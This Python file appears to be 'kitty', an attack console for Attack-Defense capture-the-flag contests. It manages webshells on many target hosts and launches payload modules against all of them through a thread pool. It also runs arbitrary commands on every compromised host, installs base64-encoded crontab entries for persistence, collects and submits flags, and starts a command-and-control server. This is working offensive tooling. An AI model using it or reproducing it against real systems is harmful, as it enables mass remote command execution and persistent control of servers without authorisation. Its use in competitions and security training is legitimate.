#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import threading
import sys
import signal
import ctypes
import inspect
import importlib
import os
import threadpool
import traceback

from cmd import Cmd
from functools import partial
from operator import itemgetter
from urllib.parse import urlparse
from utils import Utils
from collections import namedtuple
from configuration import configuration
from models.payload import Payload
from modules.monitor.monitor import Monitor
from models.runner import Runner
import modules.ccserver.ccserver as server
from modules.logger import logger

WebShell = namedtuple('WebShell','host locations password')

def payloadAttack(PaylaodCls,host):
    payload = PaylaodCls(host)
    return payload.run()

def payloadExec(armInfo):
    cmd = armInfo['cmd']
    shell = armInfo['shell']
    runner = Runner(shell)
    return runner.execute(cmd)

class InputFormatError(Exception):
    '''Input Format Error'''

class AWDConsole(Cmd):
    prompt = 'kitty>'        
    def __init__(self):
        self.cmdHelpMsg = ''
        self.shellList = []
        self.payloadResult = []
        self.execResult = []
        self._load()
        self.cmdHelpMsg = '''
Commands:
==================================
Command             Description
-------             --------------
help                print this help message
add                 add a webshell
show                show webshell list
clear               clean all webshell
monitor             webshell monitor
payload             specified a payload
crontab             specified a contab
test                test a payload with one specified host
exec                execute a command for all webshell
reload              reload configuration.json
flag                getFlag and send to platform
system              execute a system command
quit                quit awdConsole
'''
        Cmd.__init__(self)
    def _load(self):
        for host in configuration.targets:
            webshell = WebShell(host,configuration.shellLocations,Utils.getPassword(host))
            self.shellList.append(webshell)
    def preloop(self):
        welcodeStr = 'Welcome to kitty'
        print(welcodeStr)
        print(self.cmdHelpMsg)
    def emptyline(self):
        return

    def do_help(self,argv):
        if not argv:
            print(self.cmdHelpMsg)
        elif argv == 'payload':
            self._payload_help()
        else:
            func_name = 'do_'+argv
            func = getattr(self,func_name)
            if func:
                if func.__doc__:
                    print(func.__doc__)
                else:
                    print('This function is easy to use')
            else:
                print('Command ERROR')
                print(self.cmdHelpMsg)

    def do_crontab(self,argv):
        cmd = "echo {} | base64 -d > /tmp/cron_s && crontab /tmp/cron_s && rm -rf /tmp/cron_s && crontab -l".format(Utils.base64(argv+'\n'))
        # print(cmd)
        self.do_exec(cmd)
    def do_flag(self,argv):
        '''get flag of hostList and send to platform'''
        flagCmd = configuration.flagCommand
        flagmodule = importlib.import_module('modules.flag.flag')
        importlib.reload(flagmodule)
        sendFlag = flagmodule.sendFlag
        self.do_exec(flagCmd)
        logger('info','*'*10+'SEND FALG'+'*'*10)
        for host,flag in self.execResult:
            if not flag:
                logger('fail','{}:GET NOT FLAG'.format(host))
                continue
            try:
                flag = flag.strip()
                res = sendFlag(flag)
                logger('success','{}:{}'.format(host,res))
            except Exception as e:
                logger('fail','{}:{}'.format(host,str(e)))
        

    def _flag_callback(self,request,result):
        pass
    
    def _add_help(self):
        helpStr = 'add http://127.0.0.1:8080/upload.php passwd'
        print(helpStr)

    def do_add(self,argv):
        '''[example] add http://127.0.0.1:8080/upload.php passwd'''
        try:
            argv = argv.split()
            if len(argv)>2 or len(argv)==0:
                print(__doc__)
                return
            url = argv[0]
            if not any([url.startswith('http://'),url.startswith('https://')]):
                self._add_help()
                return
            host = re.findall(r'//(.*?)/',url+'/')[0]
            if len(argv) == 1:
                if not host:
                    self._add_help()
                    return
                key = Utils.getPassword(host)
            else:
                key = argv[1]
            shellLocation = urlparse(url).path
            self._add_shell(host,[shellLocation],key)
        except:
            self._add_help()

    def do_show(self,argv):
        showList = sorted(self.shellList,key=lambda shell:shell.host)
        print('{: <25} {: <50} {: <15}'.format('host','url','password'))
        for webshell in showList:
            for location in webshell.locations:
                print('{: <25} {: <50} {: <15}'.format(webshell.host,'http://'+webshell.host+location,webshell.password))
        print('{:_<25}_{:_<50}_{:_<15}'.format('_','_','_'))

    def do_clear(self,argv):
        check = input("Are you sure to remove all shells?(yes/no)")
        if check == "yes":
            self.shellList.clear()
            print('all shells removed.')
        elif check == "no":
            print("operation cancelled.")
        else:
            print("bad input.")
        

    def _payload_run(self,payloadCls,host,test=False):
        payload = payloadCls(host)
        result = payload.run(test=test)
        return result


    def do_shell(self,argv):
        self.do_system(argv)

    def do_system(self, argv):
        '''[example] system ipconfig'''
        result = os.system(argv)
        if result == 0:
            print("Success")
        else:
            print("Failed")

    def do_test(self,argv):
        '''test [default] host
example: test default 10.0.0.1
''' 
        args = argv.split()
        if len(args) == 1:
            payloadName = 'default'
            host = args[0]
        elif len(args) == 2:
            payloadName,host = tuple(args)
        else:
            raise InputFormatError
        try:
            PayloadCls = self._load_payload_class(payloadName)
            result = self._payload_run(PayloadCls,host,test=True)
            logger('success','{}:{}'.format(host,result))
        except ModuleNotFoundError as e:
            logger('fail','Payload {} Not Fount:{}'.format(payloadName,str(e)))
            print(traceback.format_exc())
            raise
        except NotImplementedError as e:
            logger('fail','Payload {} Not Implete Attack Function'.format(payloadName))
            print(traceback.format_exc())
        except Exception as e:
            logger('fail','Payload {} for {} fail:{}'.format(payloadName,host,str(e)))
            print(traceback.format_exc())
    def _load_payload_class(self,payloadName):
        try:
            payloadModule = importlib.import_module('payloads.'+payloadName)
            importlib.reload(payloadModule)
            classes = inspect.getmembers(payloadModule,inspect.isclass)
            for _,classIns in classes:
                if issubclass(classIns,Payload):
                    return classIns
            raise ModuleNotFoundError('Payload Class {} NOT Found'.format(payloadName))
        except ModuleNotFoundError:
            raise ModuleNotFoundError('Payload Class {} NOT Found'.format(payloadName))
            
    def do_payload(self, argv):
        '''run payload to get shell on all host,the payload is default.py if not specified
USAGE:payload [payloadName]'''
        self.payloadResult.clear()
        payloadName = argv if argv else 'default'
        PayloadCls = self._load_payload_class(payloadName)
        hosts = Utils.getHostList()
        payloadAttackPartial = partial(self._payload_run,PayloadCls)
        reqs = threadpool.makeRequests(payloadAttackPartial,hosts,callback=self.payload_callback,exc_callback=self.payload_except_callback)
        [configuration.pool.putRequest(req) for req in reqs]
        configuration.pool.wait()

    def _find_payload_in_dir(self,dirpath):
        result = []
        for dirpath,_,filenames in os.walk(dirpath):
            for filename in filenames:
                fullPath = os.path.join(dirpath,filename)
                if filename.endswith('.py') and not filename.startswith('__'):
                    result.append(fullPath)
        prePath = os.path.join(os.path.dirname(os.path.abspath(__file__)),'payloads') + '/'
        result = [fullPath.split(prePath)[-1][:-3] for fullPath in result]
        result = sorted([name.replace('/','.') for name in result])
        return result

    def _payload_help(self):
        path = os.path.join(os.path.dirname(os.path.realpath(__file__)),'payloads')
        payloadsAvailable = self._find_payload_in_dir(path)
        print('Available payload:\n{}'.format('\n'.join(payloadsAvailable)))

    def do_exec(self,argv):
        '''execute command on all hosts
USAGE:exec ls -l'''
        self.execResult.clear()
        armList = [{'cmd':argv,'shell':shell} for shell in self.shellList]
        reqs = threadpool.makeRequests(payloadExec,armList,callback=self.exec_callback)
        [configuration.pool.putRequest(req) for req in reqs]
        configuration.pool.wait()
        logger('info','*'*10+'EXEC RESULT'+'*'*10)
        for host,result in self.execResult:
            if result is not None:
                logger('success','{: <20}\t{}'.format(host,result))
            else:
                logger('fail','{: <20}\t{}'.format(host,'FAIL'))

    def do_monitor(self,argv):
        '''supervisor the shell depend on the host list'''
        print('{: <30}count'.format('host'))
        m = Monitor(configuration)
        result = m.scan()
        sortedResult = sorted(result.items(),key=itemgetter(0))
        for host,shellInfo in sortedResult:
            print('{: <30}{}'.format(host,str(shellInfo['count'])))
        print('_'*35)

    def do_reload(self,argv):
        '''reload configuration'''
        configuration.reload()
        self.shellList.clear()
        self.payloadResult.clear()
        self.execResult.clear()
        self._load()

    def do_quit(self,argv):
        print('Bye')
        exit()

    def _add_shell(self,host,locations,password):
        self.shellList.append(WebShell(host,locations,password))

    def payload_callback(self,request,result):
        host = request.args[0]
        if not result:
            result = 'fail'
        else:
            result = ' '.join(result)
        logger('success','{: <20}\t{}'.format(host,result))
        
        self.payloadResult.append(tuple([1,host,result]))
    def payload_except_callback(self,request,exception):
        host = request.args[0]
        errors = exception[1]
        exceptname = errors.__class__.__name__
        errors = exceptname+':'+ str(errors)
        logger('fail','{: <20}\t{}'.format(host,errors))
        self.payloadResult.append(tuple([0,host,errors]))

    def exec_callback(self,request,result):
        armInfo = request.args[0]
        shell = armInfo['shell']
        self.execResult.append(tuple([shell.host,result]))

    def onecmd(self, line):
        try:
            super().onecmd(line)
        except KeyboardInterrupt:
            configuration.pool.dismissWorkers(getattr(configuration,'poolSize',16))
            print('mission interupted')
            configuration.pool.createWorkers(getattr(configuration,'poolSize',16)-1)
        except ModuleNotFoundError:
            self._payload_help()
        except InputFormatError:
            cmd = line.split()[0]
            self.do_help(cmd)
    def completedefault(self,*ignore):
        text, line, begidx, endidx = ignore
        if line.startswith('payload ') or line.startswith('test '):
            path = os.path.join(os.path.dirname(os.path.realpath(__file__)),'payloads')
            payloads = self._find_payload_in_dir(path)
            curpayload = line[8:] if line.startswith('payload ') else line[5:]
            payloads = filter(lambda payload:payload.startswith(curpayload),payloads)
            return list(payloads)
        return []

if __name__ == '__main__':
    t = threading.Thread(target=server.app.run, args=([configuration.ccServer['port']]))
    t.setDaemon(True)
    t.start()
    console = AWDConsole()
    console.cmdloop()
